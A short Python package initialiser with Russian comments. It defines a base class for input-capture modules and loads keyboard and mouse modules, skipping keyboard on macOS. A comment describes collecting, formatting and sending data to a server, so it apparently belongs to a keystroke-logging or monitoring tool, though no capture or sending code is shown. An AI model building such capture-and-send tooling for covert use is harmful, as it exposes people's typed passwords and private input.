from platform import system
__all__ = ['keyboard', 'mouse']


class BaseModule:
    """Материнский класс для написания модулей"""
    def __init__(self, name, source):
        self.name = name
        self.source = source
        self.events = list()

    def update(self):
        # Метод который выполняет функцию получения,
        # форматирования и отправки данных на сервер
        return self.events


# Импорт модулей
from .mouse import MouseModule  # Мышь
from .keyboard import KeyboardModule  # Клавиатура

# Массив модулей для запуска
to_load = [MouseModule()] if system() == 'Darwin' else [KeyboardModule(), MouseModule()]